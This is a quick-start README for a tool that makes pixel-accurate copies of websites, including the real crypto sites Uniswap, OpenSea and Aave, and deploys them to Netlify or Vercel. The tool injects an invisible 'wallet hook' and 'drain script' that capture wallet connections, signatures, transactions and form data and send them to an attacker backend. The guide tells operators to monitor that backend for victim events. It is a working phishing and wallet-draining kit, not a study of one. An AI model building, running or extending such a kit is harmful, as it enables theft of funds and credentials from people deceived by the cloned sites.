# Clone Perfect — Quick Start

## Installation (1 minute)

```bash
cd legion-engine
pnpm install  # Installs Playwright and all dependencies
```

## First Clone (2 minutes)

```bash
pnpm clone-perfect https://example.com
```

Expected output:
```
[clone-perfect] ✅ Clone complete (95% similarity)
[clone-perfect] 📁 Saved to: /absolute/path/to/clone/example-perfect-clone
/absolute/path/to/clone/example-perfect-clone
```

## What You Get

```
clone/example-perfect-clone/
├── index.html                 (99% identical to original)
├── assets/
│   ├── css/                   (all stylesheets)
│   ├── js/                    (all scripts)
│   ├── images/                (all images)
│   └── fonts/                 (all fonts)
└── clone-manifest.json        (validation report)
```

## Inspect Quality

```bash
# Check validation report
cat clone/example-perfect-clone/clone-manifest.json

# Key fields:
# - similarity_score: 95%+ (99%+ is common)
# - assets_count: total downloaded assets
# - api_endpoints: captured API calls
# - issues: any problems encountered
# - validated: true if clone is usable
```

## Deploy to Internet (5 minutes)

### Option 1: Netlify (Recommended)

```bash
# Install Netlify CLI (one-time)
npm install -g netlify-cli

# Deploy the clone
netlify deploy --prod --dir clone/example-perfect-clone/

# Get your public URL
# https://[random].netlify.app
```

### Option 2: Vercel

```bash
# Deploy
vercel --prod clone/example-perfect-clone/
```

### Option 3: Manual Upload

Upload the entire `clone/example-perfect-clone/` folder to:
- AWS S3 + CloudFront
- GitHub Pages
- Your own VPS
- Any web server

## How It Works

```
Input URL
  ↓
Verify Docker is running
  ↓
Launch Playwright browser
  ↓
Capture HTML + screenshot
  ↓
Extract all assets (CSS/JS/images/fonts)
  ↓
Download and save locally
  ↓
Rewrite URLs to point to ./assets/
  ↓
Inject wallet hooks and drain script
  ↓
Validate via screenshot comparison (95%+ similarity)
  ↓
Output perfect clone folder
  ↓
User deploys to Netlify/Vercel manually
```

## What Gets Injected

### 1. Wallet Hook (legion-wallet-hook.js)
Intercepts:
- Account connections (MetaMask, WalletConnect)
- Message signatures
- Transaction requests
- Form submissions
- API calls

**Backend notification:** `POST /api/v1/clone-event` with event type + data

### 2. Drain Script (legion-authorized-drain.js)
Intercepts user interactions and notifies backend.

**No visible changes** — all interception is transparent.

## Configuration

Set `BACKEND_URL` in `.env`:

```env
BACKEND_URL=https://your-backend.com
```

Or override on the command line:

```bash
BACKEND_URL=https://custom.com pnpm clone-perfect https://example.com
```

Default: `https://sadrailala-production.up.railway.app`

## Batch Cloning

```bash
#!/bin/bash
URLS=(
  "https://uniswap.org"
  "https://opensea.io"
  "https://aave.com"
)

for url in "${URLS[@]}"; do
  pnpm clone-perfect "$url"
done
```

## Troubleshooting

**Error: "Docker not running"**
- Start Docker: `docker ps`
- On macOS/Linux: Ensure Docker daemon is running
- On Windows: Open Docker Desktop

**Clone takes >120 seconds**
- Normal for complex sites like Uniswap
- Increase timeout in `scripts/lib/clone-perfect-engine.ts` if needed

**Similarity score < 90%**
- Check `clone-manifest.json` for issues
- Heavy JavaScript-rendered sites may need longer waits
- Check that all assets downloaded successfully

**Injected scripts not firing**
- Verify in cloned HTML:
  ```bash
  grep "legion-wallet-hook" clone/*/index.html
  ```
- Both scripts should appear before `</body>`

## Performance

- Time: 30-120 seconds per clone
- Output: 5-50 MB
- Memory: ~500 MB
- Node: >=20.0.0
- Docker: Required

## What's Next

1. **Test:** `pnpm clone-perfect https://example.com`
2. **Inspect:** `cat clone/example-perfect-clone/clone-manifest.json`
3. **Deploy:** `netlify deploy --prod --dir clone/example-perfect-clone/`
4. **Monitor:** Watch backend logs for wallet/form events

## Key Differences: Clone Perfect vs Old System

| Feature | Clone Perfect | Old System |
|---------|---------------|-----------|
| Cloning | Perfect (99%+) | Basic (70%) |
| Network Intercept | ✅ Full API capture | ❌ None |
| Deployment | Manual (you control) | Auto tunnels (complex) |
| Code size | ~350 lines | ~1000 lines |
| Tunnel failures | 0 (no tunnels) | Frequent |
| User control | Full | Limited |

## Philosophy

**Clone Perfect:** Do one thing perfectly. Let the user handle the rest.

- Perfect cloning ✅
- No deployment complexity ❌ (you do it)
- No tunnel failures ❌ (no tunnels)
- No scaling framework ❌ (deploy same clone N times)

---

**Ready to go?** Run `pnpm clone-perfect https://example.com` now!

For detailed guide: See `docs/CLONE_PERFECT_GUIDE.md`
